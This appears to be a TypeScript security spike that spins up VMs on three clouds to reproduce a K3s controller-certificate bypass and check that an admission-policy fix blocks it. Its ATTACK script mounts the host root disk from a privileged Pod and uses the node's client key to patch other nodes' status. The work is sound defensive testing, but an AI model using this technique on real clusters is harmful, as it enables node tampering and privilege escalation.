#!/usr/bin/env tsx
/** The K3s controller identity spike; see README.md. */
import { randomBytes } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { gzipSync } from 'node:zlib';
import { setTimeout as delay } from 'node:timers/promises';
import {
  DescribeImagesCommand,
  DescribeInstancesCommand,
  EC2Client,
  RunInstancesCommand,
  type _InstanceType,
  TerminateInstancesCommand,
} from '@aws-sdk/client-ec2';
import { ComputeManagementClient } from '@azure/arm-compute';
import { NetworkManagementClient } from '@azure/arm-network';
import { ResourceManagementClient } from '@azure/arm-resources';
import { DefaultAzureCredential } from '@azure/identity';
import {
  ImagesClient,
  InstancesClient,
  protos,
  ZoneOperationsClient,
} from '@google-cloud/compute';
import { Storage } from '@google-cloud/storage';
import { AWS_NODE_POOL_BOOT } from '../../src/api/services/gateways/aws.js';
import { AZURE_NODE_POOL_BOOT } from '../../src/api/services/gateways/azure.js';
import { GCP_NODE_POOL_BOOT } from '../../src/api/services/gateways/gcp.js';
import {
  SYSTEM_RELEASE_K3S_SHA256,
  SYSTEM_RELEASE_K3S_VERSION,
} from '../../src/shared/system-release.js';
import { buildNodeStatusPolicy } from '../../src/api/services/kubernetes/cluster-addons.js';
import { buildNodePoolAgentStartupScript } from '../../src/api/services/kubernetes/node-pool-join.js';
import { buildNodePoolNamespace } from '../../src/api/services/kubernetes/node-pool-namespace.js';
import {
  NODE_POOL_MEMBER_LABEL,
  nodePoolNamespace,
  nodePoolNodeName,
  nodePoolPodScheduling,
} from '../../src/api/services/kubernetes/node-pool-scheduling.js';
import { CloudType } from '../../src/shared/cloud.js';

const TAG = { key: 'anycloud-spike', value: 'k3s-controller-node-status' };
const AWS_REGION = 'us-east-1';
const AZURE_REGION = 'westus2';
const GCP_ZONE = 'us-central1-a';
const GUEST_DEADLINE_MIN = 40;
const output = process.env.SPIKE_OUTPUT_DIR ?? join(process.cwd(), 'evidence');
const runId = process.env.GITHUB_RUN_ID ?? randomBytes(4).toString('hex');
const name = `ac-spike-k3sns-${runId}`;

interface Target {
  id: 'aws' | 'gcp' | 'azure';
  cloud: CloudType;
  size: string;
}
const TARGETS: Target[] = [
  { id: 'aws', cloud: CloudType.AWS, size: 't3.medium' },
  { id: 'gcp', cloud: CloudType.GCP, size: 'e2-standard-2' },
  { id: 'azure', cloud: CloudType.Azure, size: 'Standard_D2s_v5' },
];

/**
 * Each request a root process on the pool Node sends to the victim Node's
 * status with the shared `system:k3s-controller` certificate. `flannel` is the
 * write the policy must keep allowing.
 */
const PATCHES: Array<[string, string, unknown]> = [
  [
    'strip_member',
    'merge-patch+json',
    { metadata: { labels: { [NODE_POOL_MEMBER_LABEL]: null } } },
  ],
  [
    'add_label',
    'merge-patch+json',
    { metadata: { labels: { 'anycloud.sh/unusable-gpu': 'true' } } },
  ],
  [
    'other_annotation',
    'merge-patch+json',
    { metadata: { annotations: { 'anycloud.sh/scale-in': '1' } } },
  ],
  [
    'condition',
    'strategic-merge-patch+json',
    {
      status: {
        conditions: [{ type: 'Ready', status: 'False', reason: 'Spike' }],
      },
    },
  ],
  [
    'addresses',
    'merge-patch+json',
    { status: { addresses: [{ type: 'InternalIP', address: '10.9.9.9' }] } },
  ],
  [
    'finalizer',
    'merge-patch+json',
    { metadata: { finalizers: ['anycloud.sh/spike'] } },
  ],
  [
    'flannel',
    'merge-patch+json',
    { metadata: { annotations: { 'flannel.alpha.coreos.com/spike': 'x' } } },
  ],
];

function save(file: string, content: unknown): void {
  mkdirSync(output, { recursive: true });
  writeFileSync(
    join(output, file),
    typeof content === 'string' ? content : JSON.stringify(content, null, 2),
  );
}

/** A privileged pool Pod mounts the Node's root disk and uses its certificate. */
const ATTACK = `set -u
mkdir -p /host
mknod /tmp/root b "$MAJOR" "$MINOR" && mount /tmp/root /host || { echo "RESULT mount failed"; exit 1; }
A=/var/lib/rancher/k3s/agent
for f in /patches/*; do
  code=$(chroot /host curl -sk -o /dev/null -w '%{http_code}' \\
    --cert $A/client-k3s-controller.crt --key $A/client-k3s-controller.key \\
    -X PATCH -H "Content-Type: application/$(cat /types/$(basename $f))" \\
    --data "$(cat $f)" "https://$HOST_IP:7443/api/v1/nodes/$VICTIM/status")
  echo "RESULT $(basename $f) $code"
done`;

/** The guest: a local K3s server, the product's join script, then both phases. */
function guestScript(target: Target, uploadUrl: string) {
  const nodePoolId = `spike${target.id}`;
  const clusterId = 'spike';
  const node = nodePoolNodeName(nodePoolId, 1);
  const token = randomBytes(16).toString('hex');
  const join = buildNodePoolAgentStartupScript(
    {
      clusterId,
      nodePoolId,
      cloudProvider: target.cloud,
      vmRowId: 1,
      joinEndpoint: 'https://127.0.0.1:7443',
      certificateAuthorityData: '',
      disk: { nvme: false, systemReservedGi: 1, kubeReservedGi: 1 },
      prepullImages: [],
      boot:
        target.cloud === CloudType.Azure
          ? AZURE_NODE_POOL_BOOT
          : target.cloud === CloudType.GCP
            ? GCP_NODE_POOL_BOOT
            : AWS_NODE_POOL_BOOT,
    },
    { token },
  );
  const namespace = nodePoolNamespace(nodePoolId);
  const { policy, binding } = buildNodeStatusPolicy(clusterId);
  const attackPod = (phase: string) => ({
    apiVersion: 'v1',
    kind: 'Pod',
    metadata: { name: `attack-${phase}`, namespace },
    spec: {
      ...nodePoolPodScheduling(clusterId, nodePoolId),
      restartPolicy: 'Never',
      containers: [
        {
          name: 'main',
          image: 'public.ecr.aws/docker/library/busybox:1.36',
          command: ['sh', '-c', ATTACK],
          // A privileged pool Job's securityContext (--allow-privileged-jobs).
          securityContext: { privileged: true },
          env: [
            {
              name: 'HOST_IP',
              valueFrom: { fieldRef: { fieldPath: 'status.hostIP' } },
            },
            { name: 'VICTIM', value: `victim-${phase}` },
            { name: 'MAJOR', value: '__MAJOR__' },
            { name: 'MINOR', value: '__MINOR__' },
          ],
          volumeMounts: [
            { name: 'patches', mountPath: '/patches' },
            { name: 'types', mountPath: '/types' },
          ],
        },
      ],
      volumes: [
        { name: 'patches', configMap: { name: 'patches' } },
        { name: 'types', configMap: { name: 'types' } },
      ],
    },
  });
  const files: Record<string, unknown> = {
    'namespace.json': buildNodePoolNamespace({ clusterId, nodePoolId }),
    // Another pool's member Node, one per phase.
    ...Object.fromEntries(
      ['before', 'after'].map((phase) => [
        `victim-${phase}.spec.json`,
        {
          apiVersion: 'v1',
          kind: 'Node',
          metadata: {
            name: `victim-${phase}`,
            labels: {
              'anycloud.sh/node-pool': 'victim',
              [NODE_POOL_MEMBER_LABEL]: 'victim',
            },
          },
        },
      ]),
    ),
    'patches.json': {
      apiVersion: 'v1',
      kind: 'List',
      items: [
        {
          apiVersion: 'v1',
          kind: 'ConfigMap',
          metadata: { name: 'patches', namespace },
          data: Object.fromEntries(
            PATCHES.map(([key, , body]) => [key, JSON.stringify(body)]),
          ),
        },
        {
          apiVersion: 'v1',
          kind: 'ConfigMap',
          metadata: { name: 'types', namespace },
          data: Object.fromEntries(PATCHES.map(([key, type]) => [key, type])),
        },
      ],
    },
    'policy.json': { apiVersion: 'v1', kind: 'List', items: [policy, binding] },
    'attack-before.json': attackPod('before'),
    'attack-after.json': attackPod('after'),
  };
  const heredocs = Object.entries(files)
    .map(
      ([file, body]) => `cat > ${file} <<'JSON'\n${JSON.stringify(body)}\nJSON`,
    )
    .join('\n');
  return `#!/bin/bash
shutdown -h +${GUEST_DEADLINE_MIN}
exec > >(tee /var/log/spike.log /dev/console) 2>&1
mkdir -p /var/spike && cd /var/spike
upload() {
  journalctl -b -o short-iso-precise --no-pager -u k3s-agent > agent.journal
  journalctl -b -o short-iso-precise --no-pager -u spike-k3s-server > server.journal
  cp /var/log/spike.log .
  tar czf /var/spike.tgz -C /var/spike .
  curl -sf --retry 5 -X PUT -H 'Content-Type: application/gzip' --upload-file /var/spike.tgz ${JSON.stringify(uploadUrl)}
  shutdown -h now
}
trap upload EXIT
${heredocs}
cat > join.sh <<'ANYCLOUD_JOIN'
${join}ANYCLOUD_JOIN
dev=$(mountpoint -d /)
sed -i "s/__MAJOR__/\${dev%:*}/; s/__MINOR__/\${dev#*:}/" attack-before.json attack-after.json
curl -sfL --retry 5 https://github.com/k3s-io/k3s/releases/download/${encodeURIComponent(SYSTEM_RELEASE_K3S_VERSION)}/k3s -o /usr/local/sbin/spike-k3s
echo '${SYSTEM_RELEASE_K3S_SHA256}  /usr/local/sbin/spike-k3s' | sha256sum -c - || exit 1
chmod 755 /usr/local/sbin/spike-k3s
mkdir -p /etc/spike-k3s
cat > /etc/spike-k3s/server.yaml <<'CONFIG'
token: ${token}
disable-agent: true
# The default API server port, 6444, is the agent's load balancer port.
https-listen-port: 7443
data-dir: /var/lib/spike-k3s-server
write-kubeconfig: /etc/spike-k3s/kubeconfig
egress-selector-mode: cluster
flannel-external-ip: true
disable: [traefik, servicelb, metrics-server]
CONFIG
cat > /etc/systemd/system/spike-k3s-server.service <<'UNIT'
[Unit]
StartLimitIntervalSec=0
[Service]
ExecStart=/usr/local/sbin/spike-k3s server --config /etc/spike-k3s/server.yaml
Restart=always
RestartSec=5
UNIT
systemctl daemon-reload
systemctl start spike-k3s-server
k() { /usr/local/sbin/spike-k3s kubectl --kubeconfig /etc/spike-k3s/kubeconfig "$@"; }
for i in $(seq 120); do [ "$(k get --raw=/readyz 2>/dev/null)" = ok ] && break; sleep 2; done
bash join.sh || { echo "SPIKE join script failed"; exit 1; }
ready() { k get node ${node} --no-headers 2>/dev/null | grep -q ' Ready'; }
for i in $(seq 150); do ready && break; sleep 2; done
ready || { echo "SPIKE Node never became Ready"; exit 1; }
# What the API does once it matches the Node to its VM.
k label node ${node} ${NODE_POOL_MEMBER_LABEL}=${nodePoolId}
k create -f namespace.json -f patches.json
attack() {
  k create -f victim-$1.spec.json
  k create -f attack-$1.json
  k wait -n ${namespace} pod/attack-$1 --for=jsonpath='{.status.phase}'=Succeeded --timeout=300s
  k logs -n ${namespace} attack-$1 > attack-$1.log
  k get node victim-$1 -o json > victim-$1.json
}
echo "SPIKE before"
attack before
echo "SPIKE policy"
k create -f policy.json
# The API server picks a new policy up within a second or so.
sleep 10
attack after
k get validatingadmissionpolicy -o json > policies.json
echo "SPIKE flannel"
# Flannel writes its annotations again only when they differ from its lease.
k get node ${node} -o json > node-before-restart.json
k annotate node ${node} flannel.alpha.coreos.com/backend-data- flannel.alpha.coreos.com/public-ip-
systemctl restart k3s-agent
flannel() { k get node ${node} -o jsonpath='{.metadata.annotations.flannel\\.alpha\\.coreos\\.com/backend-data}' 2>/dev/null | grep -q VtepMAC; }
for i in $(seq 90); do flannel && ready && break; sleep 2; done
k get node ${node} -o json > node-after-restart.json
echo "flannel=$(flannel && echo restored || echo missing)" > flannel.txt
echo "ready=$(ready && echo yes || echo no)" >> flannel.txt
echo "SPIKE complete"
`;
}

/** One target's verdict from its extracted evidence. */
function analyse(dir: string) {
  const results = (phase: string) =>
    Object.fromEntries(
      readFileSync(join(dir, `attack-${phase}.log`), 'utf8')
        .split('\n')
        .filter((line) => line.startsWith('RESULT '))
        .map((line) => line.split(' ').slice(1) as [string, string]),
    );
  const victim = (phase: string) => {
    const node = JSON.parse(
      readFileSync(join(dir, `victim-${phase}.json`), 'utf8'),
    );
    return {
      labels: node.metadata?.labels ?? {},
      addresses: node.status?.addresses ?? [],
      conditions: (node.status?.conditions ?? []).map(
        (c: { type: string; status: string; reason?: string }) =>
          `${c.type}=${c.status}:${c.reason ?? ''}`,
      ),
    };
  };
  const flannel = Object.fromEntries(
    readFileSync(join(dir, 'flannel.txt'), 'utf8')
      .trim()
      .split('\n')
      .map((line) => line.split('=') as [string, string]),
  );
  const denied = readFileSync(join(dir, 'agent.journal'), 'utf8')
    .split('\n')
    .filter((line) => line.includes('denied request')).length;
  const before = results('before');
  const after = results('after');
  const victimBefore = victim('before');
  const victimAfter = victim('after');
  const attacks = PATCHES.map(([key]) => key).filter(
    (key) => key !== 'flannel',
  );
  return {
    before,
    after,
    victimBefore,
    victimAfter,
    flannel,
    agentDenials: denied,
    // Without the policy every write lands, including the protected label.
    bypassReproduced:
      attacks.every((key) => before[key] === '200') &&
      !(NODE_POOL_MEMBER_LABEL in victimBefore.labels),
    // With it only flannel's annotation lands, and flannel still works.
    fixHolds:
      attacks.every((key) => after[key] === '403') &&
      after.flannel === '200' &&
      victimAfter.labels[NODE_POOL_MEMBER_LABEL] === 'victim' &&
      !('anycloud.sh/unusable-gpu' in victimAfter.labels) &&
      flannel.flannel === 'restored' &&
      flannel.ready === 'yes' &&
      denied === 0,
  };
}

// ---------------------------------------------------------------- providers

const ec2 = () => new EC2Client({ region: AWS_REGION });
const azure = () => {
  const credential = new DefaultAzureCredential();
  const subscription = process.env.AZURE_SUBSCRIPTION_ID!;
  return {
    compute: new ComputeManagementClient(credential, subscription),
    network: new NetworkManagementClient(credential, subscription),
    resources: new ResourceManagementClient(credential, subscription),
  };
};
const gcpOptions = () => ({
  projectId: process.env.GCP_PROJECT_ID!,
  credentials: {
    client_email: process.env.GCP_CLIENT_EMAIL!,
    private_key: process.env.GCP_PRIVATE_KEY!.replace(/\\n/g, '\n'),
  },
});

async function launchAws(target: Target, script: string): Promise<void> {
  const client = ec2();
  const { Images = [] } = await client.send(
    new DescribeImagesCommand({
      Owners: ['099720109477'],
      Filters: [
        {
          Name: 'name',
          Values: ['ubuntu/images/hvm-ssd*/ubuntu-noble-24.04-amd64-server-*'],
        },
        { Name: 'state', Values: ['available'] },
      ],
    }),
  );
  const image = Images.sort((a, b) =>
    (b.CreationDate ?? '').localeCompare(a.CreationDate ?? ''),
  )[0]!;
  await client.send(
    new RunInstancesCommand({
      ImageId: image.ImageId,
      InstanceType: target.size as _InstanceType,
      NetworkInterfaces: [{ DeviceIndex: 0, AssociatePublicIpAddress: true }],
      MinCount: 1,
      MaxCount: 1,
      // Gzipped: EC2 caps encoded user data at 25600 bytes, and cloud-init
      // decompresses it.
      UserData: gzipSync(script).toString('base64'),
      InstanceInitiatedShutdownBehavior: 'terminate',
      TagSpecifications: [
        {
          ResourceType: 'instance',
          Tags: [
            { Key: TAG.key, Value: TAG.value },
            { Key: 'Name', Value: name },
          ],
        },
      ],
    }),
  );
}

async function launchAzure(target: Target, script: string): Promise<void> {
  const { compute, network, resources } = azure();
  const tags = { [TAG.key]: TAG.value };
  await resources.resourceGroups.createOrUpdate(name, {
    location: AZURE_REGION,
    tags,
  });
  const vnet = await network.virtualNetworks.beginCreateOrUpdateAndWait(
    name,
    'spike',
    {
      location: AZURE_REGION,
      tags,
      addressSpace: { addressPrefixes: ['10.10.0.0/16'] },
      subnets: [{ name: 'spike', addressPrefix: '10.10.0.0/24' }],
    },
  );
  const ip = await network.publicIPAddresses.beginCreateOrUpdateAndWait(
    name,
    target.id,
    {
      location: AZURE_REGION,
      tags,
      sku: { name: 'Standard' },
      publicIPAllocationMethod: 'Static',
    },
  );
  const nic = await network.networkInterfaces.beginCreateOrUpdateAndWait(
    name,
    target.id,
    {
      location: AZURE_REGION,
      tags,
      ipConfigurations: [
        {
          name: 'primary',
          subnet: { id: vnet.subnets![0]!.id },
          publicIPAddress: { id: ip.id },
        },
      ],
    },
  );
  await compute.virtualMachines.beginCreateOrUpdateAndWait(name, target.id, {
    location: AZURE_REGION,
    tags,
    hardwareProfile: { vmSize: target.size },
    osProfile: {
      computerName: target.id,
      adminUsername: 'spike',
      // Never used: no inbound rule exists and the join script stops SSH.
      adminPassword: `Sp1-${randomBytes(18).toString('base64url')}`,
      customData: Buffer.from(script).toString('base64'),
    },
    storageProfile: {
      imageReference: {
        publisher: 'canonical',
        offer: 'ubuntu-24_04-lts',
        sku: 'server',
        version: 'latest',
      },
      osDisk: { createOption: 'FromImage', deleteOption: 'Delete' },
    },
    networkProfile: { networkInterfaces: [{ id: nic.id, primary: true }] },
  });
}

async function launchGcp(target: Target, script: string): Promise<void> {
  const [image] = await new ImagesClient(gcpOptions()).getFromFamily({
    project: 'ubuntu-os-cloud',
    family: 'ubuntu-2404-lts-amd64',
  });
  const [operation] = await new InstancesClient(gcpOptions()).insert({
    project: process.env.GCP_PROJECT_ID!,
    zone: GCP_ZONE,
    instanceResource: {
      name,
      machineType: `zones/${GCP_ZONE}/machineTypes/${target.size}`,
      labels: { [TAG.key]: TAG.value },
      disks: [
        {
          boot: true,
          autoDelete: true,
          initializeParams: { sourceImage: image.selfLink },
        },
      ],
      networkInterfaces: [
        { accessConfigs: [{ type: 'ONE_TO_ONE_NAT', name: 'External NAT' }] },
      ],
      metadata: { items: [{ key: 'startup-script', value: script }] },
    },
  });
  await waitGcp(operation);
}

// Compute calls resolve to `{ latestResponse }`, not the LROperation their
// types declare: poll the zone operation until it is DONE.
async function waitGcp(operation: object): Promise<void> {
  const operations = new ZoneOperationsClient(gcpOptions());
  let current = (
    operation as { latestResponse: protos.google.cloud.compute.v1.IOperation }
  ).latestResponse;
  while (current.status !== 'DONE') {
    [current] = await operations.wait({
      project: process.env.GCP_PROJECT_ID!,
      zone: GCP_ZONE,
      operation: current.name!,
    });
  }
  if (current.error) {
    throw new Error(
      `GCP operation ${current.name} failed: ${JSON.stringify(current.error)}`,
    );
  }
}

async function run(only: string[]): Promise<void> {
  const targets = TARGETS.filter(
    (target) => only.length === 0 || only.includes(target.id),
  );
  // Guests upload their evidence to signed URLs on one GCS bucket; no cloud
  // credential reaches a VM.
  const bucket = new Storage(gcpOptions()).bucket(name);
  await bucket.create({
    location: 'US-CENTRAL1',
    labels: { [TAG.key]: TAG.value },
  });
  const scripts = await Promise.all(
    targets.map(async (target) => {
      const [url] = await bucket.file(`${target.id}.tgz`).getSignedUrl({
        version: 'v4',
        action: 'write',
        contentType: 'application/gzip',
        expires: Date.now() + (GUEST_DEADLINE_MIN + 15) * 60_000,
      });
      return guestScript(target, url);
    }),
  );
  save('launch.json', { runId, name, targets });
  const launch = { aws: launchAws, gcp: launchGcp, azure: launchAzure };
  const launches = await Promise.allSettled(
    targets.map((target, index) => launch[target.id](target, scripts[index]!)),
  );
  const launchErrors = launches.flatMap((outcome) =>
    outcome.status === 'rejected' ? [String(outcome.reason)] : [],
  );
  const results: Record<
    string,
    ReturnType<typeof analyse> | { error: string }
  > = {};
  const deadline = Date.now() + (GUEST_DEADLINE_MIN + 5) * 60_000;
  // A target that never launched has nothing to wait for.
  const pending = new Set<Target['id']>();
  launches.forEach((outcome, index) => {
    const id = targets[index]!.id;
    if (outcome.status === 'fulfilled') pending.add(id);
    else results[id] = { error: `launch failed: ${String(outcome.reason)}` };
  });
  while (pending.size && Date.now() < deadline) {
    await delay(30_000);
    for (const id of [...pending]) {
      const file = bucket.file(`${id}.tgz`);
      if (!(await file.exists())[0]) continue;
      pending.delete(id);
      const dir = join(output, id);
      mkdirSync(dir, { recursive: true });
      await file.download({ destination: `${dir}.tgz` });
      execFileSync('tar', ['xzf', `${dir}.tgz`, '-C', dir]);
      try {
        results[id] = analyse(dir);
      } catch (error) {
        // A guest that stopped early says why in its last SPIKE line.
        const log = readFileSync(join(dir, 'spike.log'), 'utf8');
        results[id] = {
          error: `${String(error)}; ${log.match(/^SPIKE .*$/gm)?.pop() ?? ''}`,
        };
      }
    }
  }
  for (const id of pending) results[id] = { error: 'no evidence uploaded' };
  const sourceSha = process.env.SPIKE_SOURCE_SHA ?? null;
  save('summary.json', { runId, sourceSha, launchErrors, results });
  console.log(JSON.stringify({ launchErrors, results }, null, 2));
  const failed = Object.values(results).some(
    (r) => 'error' in r || !r.bypassReproduced || !r.fixHolds,
  );
  if (launchErrors.length || failed) {
    throw new Error('a target did not reproduce or hold; see summary.json');
  }
}

/** Remove everything tagged for this experiment, on every cloud, and verify. */
async function cleanup(): Promise<void> {
  const client = ec2();
  const awsOwned = async () => {
    const { Reservations = [] } = await client.send(
      new DescribeInstancesCommand({
        Filters: [
          { Name: `tag:${TAG.key}`, Values: [TAG.value] },
          {
            Name: 'instance-state-name',
            Values: [
              'pending',
              'running',
              'stopping',
              'stopped',
              'shutting-down',
            ],
          },
        ],
      }),
    );
    return Reservations.flatMap((r) => r.Instances ?? []).map(
      (i) => i.InstanceId!,
    );
  };
  const { resources } = azure();
  const azureOwned = async () => {
    const groups: string[] = [];
    for await (const group of resources.resourceGroups.list({
      filter: `tagName eq '${TAG.key}' and tagValue eq '${TAG.value}'`,
    })) {
      groups.push(group.name!);
    }
    return groups;
  };
  const instances = new InstancesClient(gcpOptions());
  const gcpOwned = async () => {
    const [list] = await instances.list({
      project: process.env.GCP_PROJECT_ID!,
      zone: GCP_ZONE,
      filter: `labels.${TAG.key}=${TAG.value}`,
    });
    return list.map((instance) => instance.name!);
  };
  const storage = new Storage(gcpOptions());
  const bucketsOwned = async () => {
    const [buckets] = await storage.getBuckets({ prefix: 'ac-spike-k3sns-' });
    return buckets
      .filter((b) => b.metadata.labels?.[TAG.key] === TAG.value)
      .map((b) => b.name);
  };
  const removed = {
    aws: await awsOwned(),
    azure: await azureOwned(),
    gcp: await gcpOwned(),
    buckets: await bucketsOwned(),
  };
  if (removed.aws.length) {
    await client.send(
      new TerminateInstancesCommand({ InstanceIds: removed.aws }),
    );
  }
  await Promise.all([
    ...removed.azure.map((group) =>
      resources.resourceGroups.beginDeleteAndWait(group),
    ),
    ...removed.gcp.map(async (instance) => {
      const [operation] = await instances.delete({
        project: process.env.GCP_PROJECT_ID!,
        zone: GCP_ZONE,
        instance,
      });
      await waitGcp(operation);
    }),
    ...removed.buckets.map(async (bucket) => {
      await storage.bucket(bucket).deleteFiles({ force: true });
      await storage.bucket(bucket).delete();
    }),
  ]);
  for (let attempt = 0; attempt < 40; attempt++) {
    const remaining = {
      aws: await awsOwned(),
      azure: await azureOwned(),
      gcp: await gcpOwned(),
      buckets: await bucketsOwned(),
    };
    if (Object.values(remaining).every((list) => list.length === 0)) {
      save('cleanup.json', { removed, remaining });
      return;
    }
    await delay(15_000);
  }
  throw new Error('tagged spike resources remain after cleanup');
}

const [phase = process.env.SPIKE_PHASE ?? 'run', ...only] =
  process.argv.slice(2);
await (phase === 'cleanup' ? cleanup() : run(only));
